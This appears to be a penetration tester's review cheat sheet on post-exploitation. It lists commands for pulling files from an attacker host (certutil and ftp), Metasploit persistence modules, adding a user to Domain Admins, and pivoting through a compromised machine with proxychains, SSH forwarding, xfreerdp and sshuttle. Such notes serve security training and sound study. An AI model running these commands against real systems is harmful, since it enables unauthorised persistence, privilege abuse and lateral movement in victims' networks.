## Post Exploitation - Review

### ðŸš© File transfers
* python -m SimpleHTTPServer 80
* python -m pyftpdlib 21 (attacker ip)
*   ftp attackerip (windows machines)
* Certutil.exe -urlcache -f http://ip.address/bad.txt output.txt
* wget (linux machines)
* metasploit

---

### ðŸš© Maintaining access

#### Persistence Scripts (Metasploit)
* run persistence -h
* exploit/windows/local/persistence
* exploit/windows/local/registry_persistence

#### Scheduled Tasks
* run scheduleme
* run schtaskabuse

#### Add a user
* net user FakeUser Password1 /add
* net group "Domain Admins" hawkeye /ADD /DOMAIN 

---

### ðŸš© Pivoting - Using a compromised device as a condui to reach new locations. For situations when a secondary device is only reachable through a compromised device, or for more covert activities (more in the realms of Red Teaming).

#### ðŸ”´ Proxychains: Bind port, Proxychain, Proxy  
Scenario:
1. device 1 has access to device 2 which is unreachable from our attacker machine device 0  
2. proxychain and bind port is setup on device 0  
3. proxy tunnel on devive 1  
4. target is device 2

check our proxychain config file and edit the bind port if required  

         cat /etc/proxychains4.conf

now we ssh into device 1, -f backgrounds the ssh, -N do not execute remote commands only port forward, -D to bind on port, -i pivot the ssh private key file combined with the username.

         ssh -f -N -D 9050 -i pivot root@10.10.155.5

now we can run commands on device 2

         proxychains nmap -p88 10.10.10.255 (syn scan)
         proxychains nmap -p88 10.10.10.255 sT (tcp scan, could be better)

#### ðŸ”´ Xfreerdp: RDP pivot into a device by placing proxychains infront of the normal syntax
   
      proxychains xfreerdp /u:administrator /p:'Password1' /v:10.10.10.225

#### ðŸ”´ Sshuttle

      sshuttle -r user@ip.of.device1 ip.of.target/24 --ssh-cmd "ssh -i pivot"
      
keeping the sshuttle terminal live, move to new terminal. Aslong as the sshuttle terminal is up we can execute commands in the new terminal without having to type 'proxychains' infront of every command if using proxychain.

#### ðŸ”´ Chisel
another tool used for pivoting and tunneling. 

---

### Cleaning up


